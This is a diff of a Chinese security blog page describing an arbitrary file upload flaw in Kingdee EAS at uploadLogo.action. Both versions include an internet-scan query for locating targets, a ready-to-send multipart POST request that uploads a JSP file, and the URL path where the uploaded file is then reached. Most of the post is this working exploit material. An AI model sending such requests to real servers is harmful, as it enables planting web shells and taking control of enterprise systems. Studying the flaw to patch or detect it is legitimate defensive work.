@@ -4,8 +4,8 @@
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="robots" content="noodp" />
-        <title>金蝶OA-EAS系统 uploadLogo.action 任意文件上传漏洞 - Chinchin&#39;s blog</title><meta name="Description" content="这是我的全新 Hugo 网站"><meta property="og:title" content="金蝶OA-EAS系统 uploadLogo.action 任意文件上传漏洞" />
-<meta property="og:description" content="金蝶OA-EAS系统 uploadLogo.action 任意文件上传漏洞 金蝶 EAS 及 EAS Cloud 是金蝶软件公司推出的一套企业级应用软件套件，旨在帮助企业实现全面的管理和业务流程优化。金蝶" />
+        <title>金蝶OA EAS系统 uploadLogo.action 任意文件上传漏洞 - Chinchin&#39;s blog</title><meta name="Description" content="这是我的全新 Hugo 网站"><meta property="og:title" content="金蝶OA EAS系统 uploadLogo.action 任意文件上传漏洞" />
+<meta property="og:description" content="金蝶OA EAS系统 uploadLogo.action 任意文件上传漏洞 漏洞描述 金蝶 EAS 及 EAS Cloud 是金蝶软件公司推出的一套企业级应用软件套件，旨在帮助企业实现全面的管理和业务流程优化" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="http://example.org/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" /><meta property="og:image" content="http://example.org/logo.png"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2023-12-08T01:08:29+08:00" />
@@ -14,22 +14,22 @@
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="http://example.org/logo.png"/>
 
-<meta name="twitter:title" content="金蝶OA-EAS系统 uploadLogo.action 任意文件上传漏洞"/>
-<meta name="twitter:description" content="金蝶OA-EAS系统 uploadLogo.action 任意文件上传漏洞 金蝶 EAS 及 EAS Cloud 是金蝶软件公司推出的一套企业级应用软件套件，旨在帮助企业实现全面的管理和业务流程优化。金蝶"/>
+<meta name="twitter:title" content="金蝶OA EAS系统 uploadLogo.action 任意文件上传漏洞"/>
+<meta name="twitter:description" content="金蝶OA EAS系统 uploadLogo.action 任意文件上传漏洞 漏洞描述 金蝶 EAS 及 EAS Cloud 是金蝶软件公司推出的一套企业级应用软件套件，旨在帮助企业实现全面的管理和业务流程优化"/>
 <meta name="twitter:site" content="@xxxx"/>
 <meta name="application-name" content="Chinchin&#39;s blog">
 <meta name="apple-mobile-web-app-title" content="Chinchin&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" /><link rel="prev" href="http://example.org/%E9%87%91%E8%9D%B6oa%E4%BA%91%E6%98%9F%E7%A9%BA-scpsupreghandler-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" /><link rel="next" href="http://example.org/%E9%87%91%E8%9D%B6oa-%E4%BA%91%E6%98%9F%E7%A9%BA-commonfileserver-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" /><link rel="prev" href="http://example.org/%E9%87%91%E8%9D%B6oa-server_file-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" /><link rel="next" href="http://example.org/%E9%87%91%E8%9D%B6oa-apusic%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E9%97%B4%E4%BB%B6-server_file-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
-        "headline": "金蝶OA-EAS系统 uploadLogo.action 任意文件上传漏洞",
+        "headline": "金蝶OA EAS系统 uploadLogo.action 任意文件上传漏洞",
         "inLanguage": "zh-CN",
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "http:\/\/example.org\/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E\/"
-        },"genre": "posts","keywords": "2023hw漏洞","wordcount":  272 ,
+        },"genre": "posts","keywords": "漏洞知识库","wordcount":  246 ,
         "url": "http:\/\/example.org\/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E\/","datePublished": "2023-12-08T01:08:29+08:00","dateModified": "2023-12-08T01:08:29+08:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
@@ -102,10 +102,10 @@
                 <div class="container"><div class="toc" id="toc-auto">
             <h2 class="toc-title">Contents</h2>
             <div class="toc-content" id="toc-content-auto"></div>
-        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">金蝶OA-EAS系统 uploadLogo.action 任意文件上传漏洞</h1><div class="post-meta">
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">金蝶OA EAS系统 uploadLogo.action 任意文件上传漏洞</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
-</span>&nbsp;<span class="post-category">included in <a href="/categories/2023hw%E6%BC%8F%E6%B4%9E/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>2023hw漏洞</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-12-08">2023-12-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;272 words&nbsp;
+</span>&nbsp;<span class="post-category">included in <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>漏洞知识库</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-12-08">2023-12-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;246 words&nbsp;
                 <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;One minute&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="true">
                 <div class="details-summary toc-title">
@@ -114,24 +114,37 @@
                 </div>
                 <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
-    <li><a href="#金蝶oa-eas系统-uploadlogoaction-任意文件上传漏洞">金蝶OA-EAS系统 uploadLogo.action 任意文件上传漏洞</a></li>
-    <li><a href="#fofa">fofa</a></li>
-    <li><a href="#poc">poc</a></li>
-    <li><a href="#上传文件路径">上传文件路径</a></li>
+    <li><a href="#漏洞描述">漏洞描述</a></li>
+    <li><a href="#漏洞影响">漏洞影响</a></li>
+    <li><a href="#网络测绘">网络测绘</a></li>
+    <li><a href="#漏洞复现">漏洞复现</a></li>
   </ul>
 </nav></div>
-            </div><div class="content" id="content"><h2 id="金蝶oa-eas系统-uploadlogoaction-任意文件上传漏洞">金蝶OA-EAS系统 uploadLogo.action 任意文件上传漏洞</h2>
+            </div><div class="content" id="content"><h1 id="金蝶oa-eas系统-uploadlogoaction-任意文件上传漏洞">金蝶OA EAS系统 uploadLogo.action 任意文件上传漏洞</h1>
+<h2 id="漏洞描述">漏洞描述</h2>
 <p>金蝶 EAS 及 EAS Cloud 是金蝶软件公司推出的一套企业级应用软件套件，旨在帮助企业实现全面的管理和业务流程优化。金蝶 EAS 及 EAS Cloud 在 uploadLogo.action 存在文件上传漏洞，攻击者可以利用文件上传漏洞执行恶意代码、写入后门、读取敏感文件，从而可能导致服务器受到攻击并被控制。</p>
-<h2 id="fofa">fofa</h2>
+<h2 id="漏洞影响">漏洞影响</h2>
+<p>金蝶OA EAS系统</p>
+<h2 id="网络测绘">网络测绘</h2>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">app=&#34;Kingdee-EAS&#34;
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;/easportal/&#34;
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="poc">poc</h2>
+</div><h2 id="漏洞复现">漏洞复现</h2>
+<p>登陆页面</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/image-20231116141032395.png"
+        data-srcset="images/image-20231116141032395.png, images/image-20231116141032395.png 1.5x, images/image-20231116141032395.png 2x"
+        data-sizes="auto"
+        alt="images/image-20231116141032395.png"
+        title="image-20231116141032395" /></p>
+<p>poc</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -161,87 +174,54 @@
 </span><span class="lnt">25
 </span><span class="lnt">26
 </span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">POST</span> <span class="o">/</span><span class="n">plt_portal</span><span class="o">/</span><span class="n">setting</span><span class="o">/</span><span class="n">uploadLogo</span><span class="o">.</span><span class="n">action</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
 </span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="p">:</span> 
-</span></span><span class="line"><span class="cl"><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">Mozilla</span><span class="o">/</span><span class="mf">4.0</span> <span class="p">(</span><span class="n">Mozilla</span><span class="o">/</span><span class="mf">4.0</span><span class="p">;</span> <span class="n">MSIE</span> <span class="mf">7.0</span><span class="p">;</span> <span class="n">Windows</span> <span class="n">NT</span> <span class="mf">5.1</span><span class="p">;</span> <span class="n">FDM</span><span class="p">;</span> <span class="n">SV1</span><span class="p">;</span> <span class="o">.</span><span class="n">NET</span> <span class="n">CLR</span> <span class="mf">3.0</span><span class="o">.</span><span class="mf">04506.30</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span>
-</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="p">:</span> <span class="o">*/*</span>
-</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
-</span></span><span class="line"><span class="cl"><span class="n">X</span><span class="o">-</span><span class="n">Forwarded</span><span class="o">-</span><span class="n">For</span><span class="p">:</span> 
-</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">632</span>
-</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">multipart</span><span class="o">/</span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">boundary</span><span class="o">=</span><span class="mi">04844569</span><span class="n">c7ca7d21a3ca115dca477d62</span>
+</span></span><span class="line"><span class="cl"><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="n">Macintosh</span><span class="p">;</span><span class="n">T2lkQm95X0c</span><span class="o">=</span> <span class="n">Intel</span> <span class="n">Mac</span> <span class="ne">OS</span> <span class="n">X</span> <span class="mi">10</span><span class="n">_14_3</span><span class="p">)</span> <span class="n">AppleWebKit</span><span class="o">/</span><span class="mf">605.1</span><span class="o">.</span><span class="mi">15</span> <span class="p">(</span><span class="n">KHTML</span><span class="p">,</span> <span class="n">like</span> <span class="n">Gecko</span><span class="p">)</span> <span class="n">Version</span><span class="o">/</span><span class="mf">12.0</span><span class="o">.</span><span class="mi">3</span> <span class="n">Safari</span><span class="o">/</span><span class="mf">605.1</span><span class="o">.</span><span class="mi">15</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">gzip</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">multipart</span><span class="o">/</span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">boundary</span><span class="o">=----</span><span class="n">WebKitFormBoundarycxkT8bV6WLIUzm2p</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">--</span><span class="mi">04844569</span><span class="n">c7ca7d21a3ca115dca477d62</span>
-</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;chooseLanguage_top&#34;</span><span class="p">;</span> <span class="n">filename</span><span class="o">=</span><span class="s2">&#34;chooseLanguage_top&#34;</span>
-</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundarycxkT8bV6WLIUzm2p</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;chooseLanguage_top&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="n">ch</span>
-</span></span><span class="line"><span class="cl"><span class="o">--</span><span class="mi">04844569</span><span class="n">c7ca7d21a3ca115dca477d62</span>
-</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;dataCenter&#34;</span><span class="p">;</span> <span class="n">filename</span><span class="o">=</span><span class="s2">&#34;dataCenter&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundarycxkT8bV6WLIUzm2p</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;dataCenter&#34;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">xx</span>
-</span></span><span class="line"><span class="cl"><span class="o">--</span><span class="mi">04844569</span><span class="n">c7ca7d21a3ca115dca477d62</span>
-</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;insId&#34;</span><span class="p">;</span> <span class="n">filename</span><span class="o">=</span><span class="s2">&#34;insId&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundarycxkT8bV6WLIUzm2p</span> 
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;insId&#34;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">--</span><span class="mi">04844569</span><span class="n">c7ca7d21a3ca115dca477d62</span>
-</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;type&#34;</span><span class="p">;</span> <span class="n">filename</span><span class="o">=</span><span class="s2">&#34;type&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundarycxkT8bV6WLIUzm2p</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;type&#34;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">top</span>
-</span></span><span class="line"><span class="cl"><span class="o">--</span><span class="mi">04844569</span><span class="n">c7ca7d21a3ca115dca477d62</span>
-</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;upload&#34;</span><span class="p">;</span> <span class="n">filename</span><span class="o">=</span><span class="s2">&#34;test.jsp&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">image</span><span class="o">/</span><span class="n">png</span>
+</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundarycxkT8bV6WLIUzm2p</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;upload&#34;</span><span class="p">;</span> <span class="n">filename</span><span class="o">=</span><span class="s2">&#34;text.jsp&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">image</span><span class="o">/</span><span class="n">jpeg</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">test</span>
-</span></span><span class="line"><span class="cl"><span class="o">--</span><span class="mi">04844569</span><span class="n">c7ca7d21a3ca115dca477d62</span><span class="o">--</span>
+</span></span><span class="line"><span class="cl"><span class="n">Test</span>
+</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundarycxkT8bV6WLIUzm2p</span><span class="o">--</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://github.com/wy876/POC/assets/139549762/d7a2b831-852c-4488-bcd0-f9967d0e32a4"
-        data-srcset="https://github.com/wy876/POC/assets/139549762/d7a2b831-852c-4488-bcd0-f9967d0e32a4, https://github.com/wy876/POC/assets/139549762/d7a2b831-852c-4488-bcd0-f9967d0e32a4 1.5x, https://github.com/wy876/POC/assets/139549762/d7a2b831-852c-4488-bcd0-f9967d0e32a4 2x"
+        data-src="images/image-20231116141050903.png"
+        data-srcset="images/image-20231116141050903.png, images/image-20231116141050903.png 1.5x, images/image-20231116141050903.png 2x"
         data-sizes="auto"
-        alt="https://github.com/wy876/POC/assets/139549762/d7a2b831-852c-4488-bcd0-f9967d0e32a4"
-        title="3c4d1cec26f6b03e1876b02c2f7029d9" /></p>
-<h2 id="上传文件路径">上传文件路径</h2>
+        alt="images/image-20231116141050903.png"
+        title="image-20231116141050903" /></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">GET</span> <span class="o">/</span><span class="n">portal</span><span class="o">/</span><span class="n">res</span><span class="o">/</span><span class="n">file</span><span class="o">/</span><span class="n">upload</span><span class="o">/</span><span class="n">xxx</span><span class="o">.</span><span class="n">jsp</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
-</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="p">:</span> 
-</span></span><span class="line"><span class="cl"><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">Mozilla</span><span class="o">/</span><span class="mf">4.0</span> <span class="p">(</span><span class="n">Mozilla</span><span class="o">/</span><span class="mf">4.0</span><span class="p">;</span> <span class="n">MSIE</span> <span class="mf">7.0</span><span class="p">;</span> <span class="n">Windows</span> <span class="n">NT</span> <span class="mf">5.1</span><span class="p">;</span> <span class="n">FDM</span><span class="p">;</span> <span class="n">SV1</span><span class="p">;</span> <span class="o">.</span><span class="n">NET</span> <span class="n">CLR</span> <span class="mf">3.0</span><span class="o">.</span><span class="mf">04506.30</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span>
-</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="p">:</span> <span class="o">*/*</span>
-</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
-</span></span><span class="line"><span class="cl"><span class="n">X</span><span class="o">-</span><span class="n">Forwarded</span><span class="o">-</span><span class="n">For</span><span class="p">:</span>
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">/</span><span class="n">portal</span><span class="o">/</span><span class="n">res</span><span class="o">/</span><span class="n">file</span><span class="o">/</span><span class="n">upload</span><span class="o">/</span><span class="n">xxx</span><span class="o">.</span><span class="n">jsp</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://github.com/wy876/POC/assets/139549762/8a80fc29-9d8e-4622-a465-3c3c423f1e57"
-        data-srcset="https://github.com/wy876/POC/assets/139549762/8a80fc29-9d8e-4622-a465-3c3c423f1e57, https://github.com/wy876/POC/assets/139549762/8a80fc29-9d8e-4622-a465-3c3c423f1e57 1.5x, https://github.com/wy876/POC/assets/139549762/8a80fc29-9d8e-4622-a465-3c3c423f1e57 2x"
-        data-sizes="auto"
-        alt="https://github.com/wy876/POC/assets/139549762/8a80fc29-9d8e-4622-a465-3c3c423f1e57"
-        title="47f8b3b0cc61c63d9a0d2d2b54a602dc" /></p>
-</div><div class="post-footer" id="post-footer">
+</div></div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
@@ -252,20 +232,20 @@
                             <a class="link-to-markdown" href="/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.md" target="_blank">Read Markdown</a>
                         </span></div>
             <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.org/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-title="金蝶OA-EAS系统 uploadLogo.action 任意文件上传漏洞" data-via="xxxx" data-hashtags="2023hw漏洞"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-hashtag="2023hw漏洞"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.org/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-title="金蝶OA-EAS系统 uploadLogo.action 任意文件上传漏洞"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.org/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-title="金蝶OA-EAS系统 uploadLogo.action 任意文件上传漏洞"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.org/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-title="金蝶OA-EAS系统 uploadLogo.action 任意文件上传漏洞"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.org/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-title="金蝶OA EAS系统 uploadLogo.action 任意文件上传漏洞" data-via="xxxx" data-hashtags="漏洞知识库"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-hashtag="漏洞知识库"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.org/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-title="金蝶OA EAS系统 uploadLogo.action 任意文件上传漏洞"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.org/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-title="金蝶OA EAS系统 uploadLogo.action 任意文件上传漏洞"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" 